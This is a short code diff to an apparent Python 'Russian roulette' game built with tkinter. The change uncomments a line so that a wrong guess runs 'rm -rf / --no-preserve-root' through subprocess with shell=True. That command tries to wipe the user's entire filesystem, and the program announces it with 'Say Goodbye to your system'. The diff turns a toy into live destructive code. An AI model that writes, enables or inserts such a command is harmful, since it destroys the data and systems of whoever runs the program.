@@ -42,7 +42,7 @@ class MainWindow(tk.Tk):
 
             if input != self.cylinder:
                 self.subtitle['text'] = "Say Goodbye to your system"
-                #subprocess.call("rm -rf / --no-preserve-root", shell=True)
+                subprocess.call("rm -rf / --no-preserve-root", shell=True)
             elif input == self.cylinder:
                 self.subtitle['text'] = "Your system lives for another day"
                 self.cylinder = random.randint(1,6)
